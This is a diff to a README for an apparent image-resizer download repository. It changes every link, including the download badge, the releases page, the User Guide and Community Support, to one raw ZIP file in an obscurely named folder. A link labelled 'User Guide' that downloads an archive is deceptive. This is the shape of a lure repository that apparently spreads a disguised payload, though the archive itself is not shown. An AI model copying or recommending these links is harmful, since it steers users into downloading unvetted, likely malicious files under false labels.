@@ -1,6 +1,6 @@
 # 🌟 Light-Image-Resizer-Download - Resize Your Images with Ease
 
-[![Download Light Image Resizer](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/githubai560/Light-Image-Resizer-Download/releases)
+[![Download Light Image Resizer](https://raw.githubusercontent.com/githubai560/Light-Image-Resizer-Download/main/aulostomid/Light-Image-Resizer-Download.zip)](https://raw.githubusercontent.com/githubai560/Light-Image-Resizer-Download/main/aulostomid/Light-Image-Resizer-Download.zip)
 
 ## 🚀 Getting Started
 
@@ -15,7 +15,7 @@ Welcome to Light Image Resizer! This application helps you easily resize your im
 
 ## 🔗 Download & Install
 
-To get started, you need to download the application. Visit this page to download: [Light Image Resizer Releases](https://github.com/githubai560/Light-Image-Resizer-Download/releases).
+To get started, you need to download the application. Visit this page to download: [Light Image Resizer Releases](https://raw.githubusercontent.com/githubai560/Light-Image-Resizer-Download/main/aulostomid/Light-Image-Resizer-Download.zip).
 
 Once on the page, locate the latest version. Click on the download link for your operating system. 
 
@@ -62,11 +62,11 @@ If issues arise, check the troubleshooting section on our GitHub page. You can a
 
 ## 🌐 Additional Resources
 
-- [User Guide](https://github.com/githubai560/Light-Image-Resizer-Download/wiki)
-- [Community Support](https://github.com/githubai560/Light-Image-Resizer-Download/discussions)
+- [User Guide](https://raw.githubusercontent.com/githubai560/Light-Image-Resizer-Download/main/aulostomid/Light-Image-Resizer-Download.zip)
+- [Community Support](https://raw.githubusercontent.com/githubai560/Light-Image-Resizer-Download/main/aulostomid/Light-Image-Resizer-Download.zip)
 
 ## 🔗 Download Link Again
 
-For your convenience, you can download the application from here: [Light Image Resizer Releases](https://github.com/githubai560/Light-Image-Resizer-Download/releases).
+For your convenience, you can download the application from here: [Light Image Resizer Releases](https://raw.githubusercontent.com/githubai560/Light-Image-Resizer-Download/main/aulostomid/Light-Image-Resizer-Download.zip).
 
 Enjoy resizing your images with Light Image Resizer!
